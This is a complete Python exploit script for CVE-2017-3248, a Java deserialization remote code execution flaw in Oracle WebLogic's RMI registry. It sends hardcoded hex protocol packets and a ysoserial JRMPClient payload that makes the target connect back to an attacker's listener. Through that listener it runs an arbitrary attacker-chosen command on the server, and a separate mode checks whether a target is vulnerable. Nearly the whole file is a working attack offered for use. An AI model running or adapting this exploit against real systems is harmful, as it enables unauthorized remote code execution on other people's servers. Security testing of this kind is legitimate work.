#!/usr/bin/python
# -*- coding: utf-8 -*-

from argparse import RawTextHelpFormatter
import socket, argparse, subprocess, ssl, os.path

HELP_MESSAGE = '''
--------------------------------------------------------------------------------------
Developped by bobsecq: quentin.hardy@protonmail.com (quentin.hardy@bt.com)

This script is the first public exploit/POC for:
- Exploiting CVE-2017-3248 (Oracle WebLogic RMI Registry UnicastRef Object Java Deserialization Remote Code Execution)
- Checking if a weblogic server is vulnerable

This script needs the last version of Ysoserial (https://github.com/frohoff/ysoserial)

Version affected (according to Oracle):
- 10.3.6.0
- 12.1.3.0
- 12.2.1.0
- 12.2.1.1
--------------------------------------------------------------------------------------
'''
'''
Tested on 12.1.2.0

For technical information, see:
- https://www.tenable.com/security/research/tra-2017-07
- http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html

Vulnerability identified by Jacob Baines (Tenable Network Security)
but exploit/POC has not been published!
'''

#COMMANDS
ARGS_YSO_GET_PAYLOD = "JRMPClient {0}:{1} |xxd -p| tr -d '\n'" #{0}: IP, {1}: port for connecting 'back' (i.e. attacker IP)
CMD_GET_JRMPCLIENT_PAYLOAD = "java -jar {0} {1}"# {0} YSOSERIAL_PATH, {1}ARGS_YSO_GET_PAYLOD
CMD_YSO_LISTEN = "java -cp {0} ysoserial.exploit.JRMPListener {1} {2} '{3}'"# {0} YSOSERIAL_PATH, {1}PORT, {2}payloadType, {3}command

#PAYLOADS
#A. Packet 1 to send:
payload_1 = '74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'
#B. Packet 2 to send:
payload_2 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e32323700124141414141414141414141413154362e656883348cd60000000700001b59ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd071a7727000d3131312e3131312e302e31313161863d1d0000000078'
#C. Packet 3 to send:
#C.1 length
payload_3_1 = "000003b3"
#C.2 first part
payload_3_2 = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000'
#C.3.1 sub payload
payload_3_3_1 = 'aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
#C.3.2 Ysoserial Payload generated in real time
payload_3_3_2 = ""
#C.4 End of the payload
payload_3_4 = 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'

def runCmd(cmd):
	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc.stdout.read() + proc.stderr.read()
	return stdout_value

def getJrmpClientPayloadEncoded(attackerIp, attackerJRMPListenerPort, ysoPath):
	completeCmd = CMD_GET_JRMPCLIENT_PAYLOAD.format(ysoPath, ARGS_YSO_GET_PAYLOD.format(attackerIp, attackerJRMPListenerPort))
	print "[+] Ysoserial command (JRMP client): {0}".format(repr(completeCmd))
	stdout = runCmd(cmd = completeCmd)
	return stdout

def exploit(targetIP, targetPort, attackerIP, attackerJRMPPort, cmd, testOnly=False, payloadType='CommonsCollections5', sslEnabled=False, ysoPath=""):
	if testOnly == True:
		attackerIP = "127.0.0.1"
		attackerJRMPPort = 0
	print "[+] Connecting to {0}:{1} ...".format(targetIP, targetPort)
	if sslEnabled == True:
		print "[+] ssl mode enabled"
		s = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
	else:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print "[+] ssl mode disabled"
	s.connect((targetIP, targetPort))
	print "[+] Connected to {0}:{1}".format(targetIP, targetPort)
	print "[+] Sending first packet..."
	#print "[S1] Sending {0}".format(repr(payload_1.decode('hex')))
	s.sendall(payload_1.decode('hex'))
	data = s.recv(4096)
	#print '[R1] Received', repr(data)
	print "[+] Sending second packet..."
	#print "[S2] Sending {0}".format(repr(payload_2.decode('hex')))
	s.sendall(payload_2.decode('hex'))
	data = s.recv(4096)
	#print '[R2] Received', repr(data)
	print "[+] Generating with ysoserial the third packet which contains a JRMPClient payload..."
	payload_3_3_2 = getJrmpClientPayloadEncoded(attackerIp=attackerIP, attackerJRMPListenerPort=attackerJRMPPort, ysoPath=ysoPath)
	payload= payload_3_1 + payload_3_2 + payload_3_3_1 + payload_3_3_2 + payload_3_4
	payload = payload.replace(payload_3_1, "0000{:04x}".format(len(payload)/2), 1)
	sendata = payload.decode('hex')
	if testOnly == False:
		print "[+] You have to execute the following command locally:"
		print "    {0}".format(CMD_YSO_LISTEN.format(ysoPath, attackerJRMPPort, payloadType,cmd))
		raw_input("[+] Press Enter when this previous command is running...")
	print "[+] Sending third packet..."
	#print "[S3] Sending {0}".format(repr(sendata))
	s.sendall(sendata)
	data = s.recv(4096)
	s.close()
	#print '[R3] Received', repr(data)
	if testOnly == True:
		if "cannot be cast to weblogic" in str(data):
			print "[+] 'cannot be cast to weblogic' string in the third response from server"
			print "\n{2}\n[-] target {0}:{1} is not vulnerable\n{2}\n".format(targetIP, targetPort, '-'*60)
		else:
			print "[+] 'cannot be cast to weblogic' string is NOT in the third response from server"
			print "\n{2}\n[+] target {0}:{1} is vulnerable\n{2}\n".format(targetIP, targetPort, '-'*60)
	else:
		print "[+] The target will connect to {0}:{1}".format(attackerIP, attackerJRMPPort)
		print "[+] The command should be executed on the target after connection on {0}:{1}".format(attackerIP, attackerJRMPPort)

def main():
	argsParsed = argparse.ArgumentParser(description=HELP_MESSAGE, formatter_class=RawTextHelpFormatter)
	argsParsed.add_argument("-t", dest='target', required=True, help='target IP')
	argsParsed.add_argument("-p", dest='port', type=int, required=True, help='target port')
	argsParsed.add_argument("--jip", dest='attackerIP', required=False, help='Local JRMP listener ip')
	argsParsed.add_argument("--jport", dest='attackerPort', type=int, default=3412, required=False, help='Local JRMP listener port (default: %(default)s)')
	argsParsed.add_argument("--cmd", dest='cmdToExecute', help='Command to execute on the target')
	argsParsed.add_argument("--check", dest='check', action='store_true', default=False, help='Check if vulnerable')
	argsParsed.add_argument("--ssl", dest='sslEnabled', action='store_true', default=False, help='Enable ssl connection')
	argsParsed.add_argument("--ysopath", dest='ysoPath', required=True, default=False, help='Ysoserial path')
	argsParsed.add_argument("--payloadType", dest='payloadType', default="CommonsCollections5", help='Payload to use in JRMP listener (default: %(default)s)')
	args = dict(argsParsed.parse_args()._get_kwargs())
	if os.path.isfile(args['ysoPath'])==False:
		print "[-] You have to give the path to Ysoserial with --ysopath (https://github.com/frohoff/ysoserial)!"
		return -1
	if args['check'] == False and args['attackerIP'] == None:
		print "[-] You have to give an IP with --jip !"
		return -1
	elif args['check'] == False and args['cmdToExecute'] == None:
		print "[-] You have to give a command to execute on the target with --cmd !"
		return -1
	if args['check'] == True:
		print "[+] Checking if target {0}:{1} is vulnerable to CVE-2017-3248 without executing a system command on the target...".format(args['target'], args['port'])
		exploit(targetIP=args['target'], targetPort=args['port'], attackerIP=None, attackerJRMPPort=None, cmd=None, testOnly=True, sslEnabled=args['sslEnabled'], ysoPath=args['ysoPath'])
	else:
		print "[+] Exploiting  target {0}:{1}...".format(args['target'], args['port'])
		exploit(targetIP=args['target'], targetPort=args['port'], attackerIP=args['attackerIP'], attackerJRMPPort=args['attackerPort'], cmd=args['cmdToExecute'], payloadType=args['payloadType'], testOnly=False, sslEnabled=args['sslEnabled'],ysoPath=args['ysoPath'])

if __name__ == "__main__":
	main()